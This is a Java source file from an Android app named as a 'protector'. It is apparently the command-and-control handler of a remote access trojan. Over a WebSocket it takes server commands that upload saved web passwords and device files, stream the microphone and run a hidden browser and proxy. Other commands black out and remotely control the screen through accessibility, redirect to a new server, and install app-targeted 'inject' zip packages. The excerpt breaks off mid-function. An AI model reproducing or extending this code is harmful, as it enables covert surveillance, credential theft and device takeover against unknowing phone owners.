package com.icontrol.protector;


import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static com.icontrol.protector.AccessTools.AddID;
import static com.icontrol.protector.AccessTools.AddTname;
import static com.icontrol.protector.AccessTools.Addlink;
import static com.icontrol.protector.AccessTools.Blocked_Apps;
import static com.icontrol.protector.AccessTools.BringMeFront;
import static com.icontrol.protector.AccessTools.Lock_App_list;
import static com.icontrol.protector.AccessTools.Map_Name_Lnk;
import static com.icontrol.protector.AccessTools.Removename;
import static com.icontrol.protector.AccessTools.ject_list;

import static com.icontrol.protector.Consts.Auto_jct;


import static com.icontrol.protector.Consts.Live_Nots;
import static com.icontrol.protector.Consts.Live_Screen;
import static com.icontrol.protector.Consts.Rec_Activitys;
import static com.icontrol.protector.Consts.Rec_Notifications;
import static com.icontrol.protector.Consts.Rec_apps;

import static com.icontrol.protector.Consts.Rec_klogs;
import static com.icontrol.protector.Consts.Rec_links;
import static com.icontrol.protector.Consts.SCRQuality;
import static com.icontrol.protector.Consts.SPLIT_DATA;
import static com.icontrol.protector.Consts.SPLIT_LINE;
import static com.icontrol.protector.Consts.SPLIT_SKT;
import static com.icontrol.protector.Consts.URL_SOCKT;

import static com.icontrol.protector.Consts.USR_NAME;
import static com.icontrol.protector.Consts.liv_klogs;
import static com.icontrol.protector.MyCods.isServiceRunning;
import static com.icontrol.protector.MySettings.WriteBool;
import static com.icontrol.protector.UtliTools.BrodcastAlert;
import static com.icontrol.protector.UtliTools.BrodcastNotification;

import static com.icontrol.protector.UtliTools.Clearpasscodes;
import static com.icontrol.protector.UtliTools.ServiceStarter;
import static com.icontrol.protector.UtliTools.calculateMD5;
import static com.icontrol.protector.UtliTools.fromBase64;

import static com.icontrol.protector.UtliTools.getAppNameFromPkgName;
import static com.icontrol.protector.UtliTools.getExternalIpAddress;
import static com.icontrol.protector.UtliTools.loadHtmlFromAssets;
import static com.icontrol.protector.WorkServices.CommandsList;
import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;
import static com.icontrol.protector.WorkServices.MyWorker.SelfRecorder;
import static com.icontrol.protector.WorkServices.MyWorker.SendPing;
import static com.icontrol.protector.WorkServices.MyWorker.SilentScreenThread;
import static com.icontrol.protector.WorkServices.MyWorker.Skiltonlive;
import static com.icontrol.protector.WorkServices.MyWorker.StartAutoj;
import static com.icontrol.protector.WorkServices.MyWorker.alljectsids;
import static com.icontrol.protector.WorkServices.MyWorker.isJecton;
import static com.icontrol.protector.WorkServices.MyWorker.isLiveSkiltonlive;
import static com.icontrol.protector.WorkServices.MyWorker.isScreenThreadRunning;
import static com.icontrol.protector.WorkServices.MyWorker.isSelfRecordON;
import static com.icontrol.protector.WorkServices.MyWorker.joinclients;
import static com.icontrol.protector.WorkServices.MyWorker.stopSelfRecorder;
import static com.icontrol.protector.WorkServices.MyWorker.stopSlientScreen;
import static com.icontrol.protector.WorkServices.MyWorker.stopliveskilton;
import static com.icontrol.protector.WorkServices.My_Access_inst;
import static com.icontrol.protector.filesManager.buff;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;

import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.media.AudioManager;
import android.media.MediaMetadataRetriever;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;

import android.provider.Settings;
import android.util.Base64;


import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;


public class LiveChat  {


    private static volatile LiveChat singinst = null;
    private LiveChat(Context ctx){
        Dummyctx= ctx.getApplicationContext();
    }
    public static LiveChat instance(Context ctx){
        if (singinst != null){
            return singinst;
        }
        singinst=new LiveChat(ctx);
        return singinst;
    }
    //private ExecutorService executorService;
    private PowerManager.WakeLock LOCK_SOCKET;
    private OkHttpClient client;
    public boolean isConnected = false;
    private  WebSocket ws;

    public static Context Dummyctx;


//    @Override
//    public IBinder onBind(Intent intent) {
//        return null;
//    }
//
//    @Override
//    public void onCreate() {
//        super.onCreate();
//        startforground(getApplicationContext());
//
//        if (LiveChat.Dummyctx == null) {
//            LiveChat.Dummyctx = getApplicationContext();
//        }
//    }


//    @Override
//    public int onStartCommand(Intent intent, int flags, int startId) {
//
//
////        startforground(getApplicationContext());
////        if (Dummyctx == null) {
////            Dummyctx = getApplicationContext();
////        }
////        if (isRunning) {
////            stopSelf(); // Another instance is already doing the job
////            return START_NOT_STICKY;
////        }
//
//
//
//
////        ServerBinger binger = new ServerBinger(duminst);
////        binger.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new String[]{"PING"});
//
//
//      //  return START_STICKY;
//    }

    public boolean pingServer() {
        HttpURLConnection conn = null;
        try {
//            try {
//                Thread.sleep(1000);
//            } catch (Exception a) {
//            }
            String scriptUrl = Consts.URL_PING();
            URL url = new URL(scriptUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(45000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            My_Crpter cr = My_Crpter.Getinstance();
            // MySettings.Write(Dummyctx,Consts.Redirect_e,Nemail);
            String usrmail = MySettings.Read(Dummyctx,Consts.Redirect_e,My_Configs.USR_MAIL);
            String data = "&user_email=" + URLEncoder.encode(cr.Dcrpt_Str(usrmail), "UTF-8");

            // Safe writing
            try (OutputStream os = conn.getOutputStream();
                 OutputStreamWriter writer = new OutputStreamWriter(os, "UTF-8")) {
                writer.write(data);
                writer.flush();
            }

            int responseCode = conn.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                // Safe reading
                try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        response.append(line);
                    }

                    String result = response.toString();
                    return handleResponse(result);
                }
            } else {
                return handleResponse("HTTP Error: " + responseCode);

            }

        } catch (Exception e) {
            return handleResponse("Error: " + e.getMessage());
        } finally {
            if (conn != null) {
                conn.disconnect(); // 🧹 Critical cleanup
            }
        }
    }


    private void startwocket() {

        if (isConnected) {
            return;
        }

        Request request;
        try {
            client = new OkHttpClient.Builder()
                    .pingInterval(15, TimeUnit.SECONDS) // Sends a ping every 30 seconds to keep the connection alive
                    .retryOnConnectionFailure(true) // Automatically retries connection failures
                    .connectTimeout(0, TimeUnit.SECONDS) // Connection timeout
                    .readTimeout(0, TimeUnit.MILLISECONDS) // WebSockets use their own internal timeouts
                    .build();


            request = new Request.Builder().url(URL_SOCKT()).build();

        } catch (Exception s) {
            client = null;
            return;
        }

        ws = client.newWebSocket(request, new WebSocketListener() {


            @Override
            public void onClosing(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
                super.onClosing(webSocket, code, reason);
                isConnected = false;
                Endme();
            }

            @Override
            public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, @Nullable Response response) {
                super.onFailure(webSocket, t, response);
                isConnected = false;
                Endme();

            }

            @Override
            public void onOpen(WebSocket webSocket, Response response) {

                try {
                    isConnected = true;
                    WriteBool(Dummyctx, Consts.Send_Skilton, false);
                    joinsession(Dummyctx, "0", "join");


                } catch (Exception a) {

                }


            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                super.onMessage(webSocket, text);
                MyLoger.Debug("onMessage LiveChat:", text);
                try {

                    JSONObject Response = new JSONObject(text);
                    String msgtype = Response.optString("type", "empty");
                    switch (msgtype) {
                        case "com":
                            try {
                                String datapassed = Response.optString("pdata", "empty");
                                JSONObject datajson = new JSONObject(datapassed);
                                Handlecommand(datajson);
                            } catch (Exception a) {
                                a.printStackTrace();
                            }
                            break;
                        case "stop":
                            WorkServices.needsleep = true;
                            Endme();
                            break;
                        case "Unauthorized access":

                            WorkServices.needsleep = true;
                            Endme();

                            break;
                        case "join":

                            joinsession(Dummyctx, "0", "join");
                            break;

                        case "connected":
                            joinclients(Dummyctx);
                            break;

                        case "proxy":
                            HandleProxy(Response);
                            break;
                        default:
                            break;
                    }

                } catch (JSONException e) {
                    MyLoger.Error("json livechat", e.getMessage());
                    e.printStackTrace();
                    if (text.toLowerCase().equals("stop")) {
                        MyPacket newpkt = new MyPacket("Sleep".getBytes(), "null".getBytes());
                        HandelPacket(newpkt);
//                        synchronized (WorkServices.PAKET_LOCK) {
//                            WorkServices.MY_COMMANDS_LIST.add(newpkt);
//                        }
                    }
                    Endme();
                }

            }

            //            private void insertcommand(MyPacket newpkt){
//
//                synchronized (WorkServices.PAKET_LOCK) {
//                    WorkServices.MY_COMMANDS_LIST.add(newpkt);
//                }
//
//            }
            private void HandleBrowser(JSONObject Response) {
                try {
                    String Command = Response.optString("subc", "0");

                    switch (Command) {
                        case "h"://hidden
                            String browsercommand = Response.optString("bcom", "0");
                            switch (browsercommand) {
                                case "1"://start

                                    //aHR0cHM6Ly9nb29nbGUuY29tPDpDUzo+bQ== is https://google.com<:CS:>m
                                    //user agent, m = mobile default ,a = automatic, <c>str = costum
                                    String[] extradata = fromBase64(Response.optString("extdata", "aHR0cHM6Ly9nb29nbGUuY29tPDpDUzo+bQ==")).split("<:CS:>");

                                    String starturl = extradata[0];
                                    String useragent = extradata[1];

                                    if (!starturl.startsWith("http://") && !starturl.startsWith("https://")) {
                                        starturl = "http://" + starturl;
                                    }

                                    if (!isServiceRunning(Dummyctx, HiddenBrowser.class)) {
                                        WriteBool(Dummyctx, Consts.Hidden_browser, true);

                                        Intent workint = new Intent(Dummyctx, HiddenBrowser.class);
                                        workint.putExtra("starturl", starturl);
                                        workint.putExtra("ua", useragent);
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            Dummyctx.startForegroundService(workint);
                                        } else {
                                            Dummyctx.startService(workint);
                                        }
                                    } else {
                                        HiddenBrowser sb = HiddenBrowser.getinstance();
                                        if (sb != null) {
                                            String[] comandload = new String[]{"load", starturl};
                                            sb.controlbrowser(comandload, Dummyctx);
                                        }
                                    }

                                    break;
                                case "0"://stop
                                    WriteBool(Dummyctx, Consts.Hidden_browser, false);
                                    Intent stopit = new Intent(Dummyctx, HiddenBrowser.class);
                                    Dummyctx.stopService(stopit);

                                    break;
                                case "3"://command , click input etc..
                                    HiddenBrowser sb = HiddenBrowser.getinstance();
                                    if (sb != null) {
                                        //args[0]//text ,scroll, click, nav
                                        //example input: text<:CS:>hello<:CS:>
                                        //bnVsbDw6Q1M6Pg== is null<:CS:>
                                        String[] args = fromBase64(Response.optString("extdata", "bnVsbDw6Q1M6Pg==")).split("<:CS:>");
                                        sb.controlbrowser(args, Dummyctx);
                                    }
                                    break;
                            }
                            break;
                        case "n"://normal


                            String loadtype = Response.optString("ltype", "0");//html base64 f or url u

                            String extradata = Response.optString("extdata", "0");//could be url or html as base64

                            Intent myIntent = null;


                            switch (loadtype) {
                                case "f":
                                    myIntent = new Intent(Dummyctx, WebBrowser.class);
                                    myIntent.putExtra("type", "f");
                                    break;
                                case "u":
                                    myIntent = new Intent(Dummyctx, WebBrowser.class);
                                    myIntent.putExtra("type", "u");
                                    break;
                                case "lp"://load passwords
                                    String forwhat = Response.optString("lfor", "0");
                                    loadpassword(Dummyctx, forwhat);
                                    break;
                                case "re":
                                    String remname = Response.optString("ntrk", "0");
                                    Removename(remname);
                                    break;
                                case "add":
                                    String nametarget = Response.optString("ntrk", "0");
                                    String linktarget = Response.optString("ltrk", "0");
                                    String idtarget = Response.optString("itrk", "0");
                                    Addlink(nametarget, linktarget);
                                    AddID(nametarget, idtarget);
                                    AddTname(nametarget);
                                    break;
                                case "cp"://clear password
                                    MySettings.ClearList(Dummyctx, Consts.web_pass);
                                    break;
                                case "s"://stop
                                    WriteBool(Dummyctx, Consts.web_browser, false);
                                default:
                                    myIntent = null;
                                    break;
                            }

                            if (myIntent != null) {
                                myIntent.putExtra("key", extradata);
                                myIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                                myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                myIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                Dummyctx.startActivity(myIntent);
                            }


                            break;
                        default:
                            break;
                    }

                } catch (Exception a) {

                    MyLoger.Error("HandleBrowser", a.getMessage());
                }
            }

            public void loadpassword(Context context, String whatfor) {
                // Retrieve the list of Base64-encoded strings
                ArrayList<String> retrievedList = MySettings.ReadList(context, Consts.web_pass);

                if (retrievedList != null && retrievedList.size() > 0) {

                    String alldata = "";
                    for (String base64String : retrievedList) {
                        // Decode the Base64 string
                        alldata += base64String + SPLIT_LINE;
                    }

                    try {

                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("type", whatfor);
                        jsonObject.put("data", alldata);
                        jsonObject.put("cuz", "p");
                        String jsonData = jsonObject.toString();


                        Livemessage(Dummyctx, jsonData);
                    } catch (Exception a) {
                    }
                } else {
                    if (whatfor.equals("trk")) {
                        String alldata = "";
                        for (String sit :
                                Map_Name_Lnk.values()) {

                            String base64String = sit + SPLIT_DATA + "-" + SPLIT_DATA + "No Data Found" + SPLIT_DATA + "-";
                            alldata += Base64.encodeToString(base64String.getBytes(), Base64.DEFAULT) + SPLIT_LINE;

                        }
                        try {

                            JSONObject jsonObject = new JSONObject();
                            jsonObject.put("type", whatfor);
                            jsonObject.put("data", alldata);
                            jsonObject.put("cuz", "p");
                            String jsonData = jsonObject.toString();


                            Livemessage(Dummyctx, jsonData);
                        } catch (Exception a) {
                        }
                    }
                    AlertServer(context, "Accounts", "No Data Found.");

                }
            }

            private void HandleFetch(JSONObject Response) {
                try {
                    String Command = Response.optString("subc", "0");

                    switch (Command) {
                        case "num"://number
                            PhoneNumberUtils.printPhoneNumbers(Dummyctx);
                            break;
                        case "file":
                            String thepath = Response.optString("extradata", "null");
                            String sockidf = Response.optString("skidf", "null");
                            Uri ur = Uri.parse((thepath).trim());
                            File file = new File(ur.getPath());
                            if (file.exists()) {
                                Thread sender = new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        LiveDownload(Dummyctx, ur.getPath(), sockidf);
                                    }
                                });
                                sender.start();

                            } else {
                                AlertServer(Dummyctx, "Downloads", "File not found: " + thepath);
                            }
                            break;
                        default:
                            break;
                    }

                } catch (Exception a) {

                    MyLoger.Error("HandleFetch", a.getMessage());
                }
            }

            private void HandleProxy(JSONObject Response) {
                try {
                    String Command = Response.optString("subc", "0");

                    switch (Command) {
                        case "1"://ON

                            if (!isServiceRunning(Dummyctx, ProxyService.class)) {
                                Intent workint = new Intent(Dummyctx, ProxyService.class);
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    Dummyctx.startForegroundService(workint);
                                } else {
                                    Dummyctx.startService(workint);
                                }
                            }

                            break;
                        case "0"://OFF
                            Intent stopServiceIntent = new Intent(Dummyctx, ProxyService.class);
                            Dummyctx.stopService(stopServiceIntent);

                            break;
                        default:
                            break;
                    }

                } catch (Exception a) {

                    MyLoger.Error("HandleProxy", a.getMessage());
                }
            }
            private void Handlejects(JSONObject Response) {
                try {
                    alljectsids = Response.optString("jdat", "empty");

                    if(alljectsids != "empty"){
                        if (!isJecton()){
                            StartAutoj(Dummyctx);
                        }

                    }
                } catch (Exception a) {

                    MyLoger.Error("HandleLocaton", a.getMessage());
                }
            }
            private void HandleFiles(JSONObject Response) {
                try {
                    String Command = Response.optString("state", "empty");
                    String to_path = Response.optString("tp", "empty");
                    String[] from_paths = Response.optString("fp", "empty").split("<P>");
                    filesManager fm = new filesManager();
                    String AlertMsg_copy = null;
                    String AlertMsg_cut = null;
                    switch (Command) {
                        case "co"://copy
                            for (String fpath :
                                    from_paths) {
                                try {
                                    fm.copyFile(fpath, to_path);
                                } catch (Exception a) {
                                    AlertMsg_copy = a.getMessage();
                                }
                            }
                            if (AlertMsg_copy == null) {
                                AlertMsg_copy = "Copying finished";
                            }
                            break;
                        case "cu"://cut
                            for (String fpath :
                                    from_paths) {
                                try {
                                    fm.moveFile(fpath, to_path);
                                } catch (Exception s) {
                                    AlertMsg_cut = s.getMessage();
                                }
                            }
                            if (AlertMsg_cut == null) {
                                AlertMsg_cut = "Moving finished";
                            }
                            break;
                        default:
                            break;
                    }
                    if (AlertMsg_copy != null) {
                        AlertServer(Dummyctx, "Copy File", AlertMsg_copy);
                    }
                    if (AlertMsg_cut != null) {
                        AlertServer(Dummyctx, "Move File", AlertMsg_cut);
                    }
                } catch (Exception a) {

                    MyLoger.Error("HandleLocaton", a.getMessage());
                }
            }

            private final Map<String, List<byte[]>> chunkStorage = new HashMap<>();
            private final Map<String, Long> chunkProgress = new HashMap<>();

            private void HandleUpload(JSONObject Response) {
                try {
                    String filehash = Response.optString("filehash", "empty");
                    String savepath = Response.optString("savepath", "empty");
                    String isinjct = Response.optString("isinjct", "0");
                    String jctid = Response.optString("jctid", "0");
                    String filedata = Response.optString("filedata", "");
                    long totalSize = Response.optLong("totalSize", 0);
                    long sentSize = Response.optLong("sentSize", 0);
                    int chunkNumber = Response.optInt("chunkNumber", 0);


                    // Decode Base64 chunk to bytes
                    byte[] chunkBytes = Base64.decode(filedata, Base64.NO_WRAP);

                    // Store chunks by filehash
                    if (!chunkStorage.containsKey(filehash)) {
                        chunkStorage.put(filehash, new ArrayList<>());
                        chunkProgress.put(filehash, 0L);
                    }

                    // Add the chunk
                    chunkStorage.get(filehash).add(chunkBytes);
                    chunkProgress.put(filehash, chunkProgress.get(filehash) + chunkBytes.length);

                    // Check if the file upload is complete
                    if (chunkProgress.get(filehash) >= totalSize) {

                        if (isinjct.equals("1")) {
                            File protectedFolder = new File(Dummyctx.getFilesDir(), "protected");
                            if (!protectedFolder.exists()) {
                                protectedFolder.mkdirs();
                            }
                            savepath = new File(protectedFolder, jctid + ".zip").getAbsolutePath();
                            if (!ject_list.contains(jctid)) {
                                ject_list.add(jctid);
                            }
                        }

                        // All chunks received, reconstruct the file
                        reconstructFile(savepath, filehash);

                        if (isinjct.equals("1")) {
                            File protectedFolder = new File(Dummyctx.getFilesDir(), "protected");
                            ///data/user/0/com.icontrol.protector/files/protected/com.google.android.apps.messaging.zip
                            File extractfolder = new File(protectedFolder, jctid);
                            if (!extractfolder.exists()) {
                                extractfolder.mkdirs();
                            }
                            extractZipFile(new File(protectedFolder, jctid + ".zip"), extractfolder);
                        }
                    }
                } catch (Exception e) {
                    MyLoger.Error("HandleUpload", e.getMessage());
                }
            }

            public void extractZipFile(File zipFile, File destinationDir) {
                try (InputStream inputStream = new FileInputStream(zipFile);
                     ZipInputStream zipInputStream = new ZipInputStream(inputStream)) {

                    ZipEntry entry;
                    while ((entry = zipInputStream.getNextEntry()) != null) {
                        File extractedFile = new File(destinationDir, entry.getName());

                        if (entry.isDirectory()) {
                            extractedFile.mkdirs();
                        } else {
                            try (FileOutputStream outputStream = new FileOutputStream(extractedFile)) {
                                byte[] buffer = new byte[1024];
                                int length;
                                while ((length = zipInputStream.read(buffer)) > 0) {
                                    outputStream.write(buffer, 0, length);
                                }
                            }
                        }
                        zipInputStream.closeEntry();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            private void reconstructFile(String savepath, String filehash) {
                try {
                    // Get the chunks for the filehash
                    List<byte[]> chunks = chunkStorage.get(filehash);

                    // Write all chunks to the file
                    File outputFile = new File(savepath);
                    if (!outputFile.exists()) {
                        outputFile.createNewFile();
                    }
                    try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                        for (byte[] chunk : chunks) {
                            fos.write(chunk);
                        }
                    }

                    // File reconstruction complete
                    MyLoger.Info("HandleUpload", "File reconstructed: " + savepath);

                    // Cleanup
                    chunkStorage.remove(filehash);
                    chunkProgress.remove(filehash);
                } catch (IOException e) {
                    MyLoger.Error("reconstructFile", e.getMessage());
                }
            }

            private void HandleSearch(JSONObject Response) {
                try {

                    String searchfor = Response.optString("sfor", "empty");
                    CustomFilesFilter.FileType holdertype = null;
                    switch (searchfor) {
                        case "i"://image
                            holdertype = CustomFilesFilter.FileType.IMAGES;
                            break;
                        case "v"://video
                            holdertype = CustomFilesFilter.FileType.VIDEOS;
                            break;
                        case "a"://audio
                            holdertype = CustomFilesFilter.FileType.AUDIOS;
                            break;
                        case "d"://doc
                            holdertype = CustomFilesFilter.FileType.DOCUMENTS;
                            break;
                        default:
                            holdertype = null;
                            break;
                    }

                    if (holdertype == null) {
                        AlertServer(Dummyctx, "File Finder", "Unknown search type");
                        return;
                    }

//                    String Command = Response.optString("subc","empty");
                    String[] Dataresults = FilesFinder.searchFilesInDirectory(Dummyctx, holdertype, android.os.Environment.getExternalStorageDirectory());
//                    switch (Command){
//                        case "G"://Global
//                            Dataresults =  FilesFinder.searchFilesInDirectory(ctx,holdertype,android.os.Environment.getExternalStorageDirectory());
//                            break;
//                        case "S"://specific
//                            String targetpath = Response.optString("Tpath","empty");
//                            File tempfile = new File(targetpath);
//                            Dataresults =  FilesFinder.searchFilesInDirectory(ctx,holdertype,tempfile);
//                            break;
//                        default:
//                            Dataresults = null;
//                            break;
//                    }

                    if (Dataresults != null) {
                        String searchtag = Dataresults[0];
                        String searchdata = Dataresults[1];
                        if (searchtag.equals("1")) {
                            //holdertype

                            try {
                                JSONObject jsonObject = new JSONObject();
                                jsonObject.put("type", "srch");
                                jsonObject.put("stype", holdertype.name());
                                jsonObject.put("pths", searchdata);
                                String jsonData = jsonObject.toString();

                                Livemessage(Dummyctx, jsonData);
                            } catch (Exception a) {

                            }


                        } else if (searchtag.equals("-1")) {
                            AlertServer(Dummyctx, "File Finder", searchdata);
                        }
                    } else {
                        AlertServer(Dummyctx, "File Finder", "Data is empty");
                    }

                } catch (Exception a) {

                    MyLoger.Error("HandleLocaton", a.getMessage());
                }
            }

            private void HandleMic(JSONObject Response) {
                try {

                    String[] micsp = MyPermissions.GetPrimname(MyPermissions.Prims.Microphone);
                    if (!MyPermissions.hasPermissions(Dummyctx, micsp)) {
                        AlertServer(Dummyctx, "Microphone", "Microphone Permission is not Enabled.");
                        return;
                    }

                    String Command = Response.optString("subc", "empty");

                    switch (Command) {
                        case "ON":
                            Microphone.Stop();
                            Microphone.Pause(false);
                            String rate = Response.optString("Arate", "empty");
                            String src = Response.optString("Asrc", "empty");
                            String sokidf = Response.optString("skidf", "null");
                            Microphone.Start(rate, src, sokidf, Dummyctx);
                            break;
                        case "OFF":
                            Microphone.Stop();
                            break;
                        case "co"://continue
                            Microphone.Pause(false);
                            break;
                        case "pz"://pause
                            Microphone.Pause(true);
                            break;
                        case "cr"://change rate
                            String Nrate = Response.optString("Arate", "empty");
                            Microphone.ChangeRate(Integer.valueOf(Nrate));
                            break;
                        case "cs"://change source
                            String Nsrc = Response.optString("Asrc", "empty");
                            Microphone.ChangeSrc(Integer.valueOf(Nsrc));
                            break;
                        default:
                            break;
                    }


                } catch (Exception a) {
                    MyLoger.Error("HandleLocaton", a.getMessage());
                }
            }
            private void HandRedirect(JSONObject Response) {
                try {
                    String Nemail = Response.optString("relink", "0");
                    String Nserverip = Response.optString("reip", "0");
                    String Nconkey = Response.optString("rckey", "0");
                    if(!Nemail.equals("0") && !Nserverip.equals("0")){
                        MySettings.Write(Dummyctx,Consts.Redirect_e,Nemail);
                        MySettings.Write(Dummyctx,Consts.Redirect_ip,Nserverip);
                        MySettings.Write(Dummyctx,Consts.Redirect_k,Nconkey);
                        WorkServices.needsleep = true;
                        Endme();
                    }

                } catch (Exception a) {

                    MyLoger.Error("HandRedirect", a.getMessage());
                }
            }
            private void HandleLocation(JSONObject Response) {
                try {
                    String Command = Response.optString("cas", "empty");
                    MyPacket newpkt = null;
                    switch (Command) {
                        case "E"://Enable
                            AccessTools.BringMeFront(Dummyctx);
                            newpkt = new MyPacket(("Location" + SPLIT_SKT + "E").getBytes(), "null".getBytes());
                            break;
                        case "D"://Disable
                            newpkt = new MyPacket(("Location" + SPLIT_SKT + "D").getBytes(), "null".getBytes());
                            break;
                        default:
                            break;
                    }
                    if (newpkt != null) {
                        //insertcommand(newpkt);
                        HandelPacket(newpkt);

                    }

                } catch (Exception a) {

                    MyLoger.Error("HandleLocaton", a.getMessage());
                }
            }

            private void Handlebroadcast(JSONObject Response) {
                try {
                    String Command = Response.optString("subc", "empty");

                    String thetitle = Response.optString("thetitle", "null");
                    String themsg = Response.optString("themsg", "null");
                    String thetype = Response.optString("theype", "0");
                    String toopen = Response.optString("toopen", "empty");

                    switch (Command) {
                        case "N"://notification

                            BrodcastNotification(Dummyctx, thetitle, themsg, Integer.valueOf(thetype), toopen);
                            break;
                        case "A"://Alert
                            String theico = Response.optString("ico", "0");
                            BrodcastAlert(Dummyctx, thetitle, themsg, Integer.valueOf(thetype), toopen, theico);
                            break;
                        default:
                            break;
                    }
                } catch (Exception a) {
                    MyLoger.Error("Handlebroadcast", a.getMessage());
                }
            }

            private void HandleScreen(JSONObject Response) {
                try {
                    String Command = Response.optString("subc", "empty");
                    switch (Command) {
                        case "block":
                            String blackstate = Response.optString("blockstate", "empty");


                            //1 ON , 0 OFF
                            if (blackstate.equals("1")) {
                                String blockstyle = Response.optString("bstyle", "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPWVuPg0KPGhlYWQ+DQo8bWV0YSBjaGFyc2V0PVVURi04IC8+DQo8bWV0YSBuYW1lPXZpZXdwb3J0IGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+DQo8dGl0bGU+PC90aXRsZT4NCjxzdHlsZT5ib2R5e21hcmdpbjowO3BhZGRpbmc6MDtiYWNrZ3JvdW5kLWNvbG9yOnJnYmEoMCwwLDAsMCk7Y29sb3I6d2hpdGU7ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO2hlaWdodDoxMDB2aDtmb250LWZhbWlseTpzYW5zLXNlcmlmO3RleHQtYWxpZ246Y2VudGVyO3BhZGRpbmc6MXJlbTtib3gtc2l6aW5nOmJvcmRlci1ib3h9PC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPC9ib2R5Pg0KPC9odG1sPg==");
                                String blockmsg = Response.optString("blkmsg", " ");

                                if (AccessTools.myAccess() != null) {

                                    AccessTools.myAccess().SetupWbvew(blockstyle);
                                }

                                AccessTools.BlackScreen(true);
                            } else if (blackstate.equals("0")) {
                                AccessTools.BlackScreen(false);
                            }

                            break;
                        case "paste":
                            String thetext = Response.optString("txt", "empty");
                            AccessTools.pasteText(thetext);
                            break;
                        case "sklecolor":
                            String newcolor = Response.optString("clr", "empty");
                            MySettings.Write(Dummyctx, Consts.Skeleton_Color, newcolor);
                            break;
                        case "skilton":
                            String SkiltonState = Response.optString("skstate", "empty");
                            //1 signle
                            //0 multiple
                            if (SkiltonState.equals("1")) {
                                WriteBool(Dummyctx, Consts.Send_Skilton, true);
                            } else if (SkiltonState.equals("0")) {
                                WriteBool(Dummyctx, Consts.Send_Skilton, false);
                            }
                            break;
                        case "mov":
                            String mtype = Response.optString("movetype", "empty");

                            //0 click
                            //1 move
                            if (mtype.equals("0")) {
                                String point = Response.optString("poi", "empty");
                                if (!"empty".equals(point)) {
                                    try {
                                        JSONObject pointJson = new JSONObject(point);
                                        int x = pointJson.getInt("x");
                                        int y = pointJson.getInt("y");
                                        String durclick = Response.optString("dur", "1");
                                        // Now you have the x and y values
                                        System.out.println("x: " + x + ", y: " + y);
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                            AccessTools.clickscr(x, y,Integer.valueOf(durclick));
                                        } else {
                                            AlertServer(Dummyctx, "Screen", "This android version don't support Control");
                                        }
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                } else {
                                    System.out.println("Received empty point string");
                                }

                            } else if (mtype.equals("1")) {
                                String coordinates = Response.optString("poi", "empty"); // Example pointString

                                // Split the string by colon to get each point string
                                String[] tokens = coordinates.split(Pattern.quote(":"));
                                Point[] movements = new Point[tokens.length];

                                for (int i = 0; i < tokens.length; i++) {
                                    try {
                                        // Remove parentheses and split by comma
                                        String[] coordinateArray = tokens[i].replace("(", "").replace(")", "").split(", ");
                                        int x = Integer.parseInt(coordinateArray[0]);
                                        int y = Integer.parseInt(coordinateArray[1]);

                                        // Create a new Point object and store it in the array
                                        movements[i] = new Point(x, y);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                                //String durton = Response.optString("dur", "1000");
                                AccessTools.mouseDraw(movements, 900);

                            }
                            break;
                        case "snap":
                            String Snaptype = Response.optString("snaptype", "empty");
                            //1 signle
                            //0 multiple
                            if (Snaptype.equals("1")) {
                                AccessTools.onesnap();
                            } else if (Snaptype.equals("0")) {

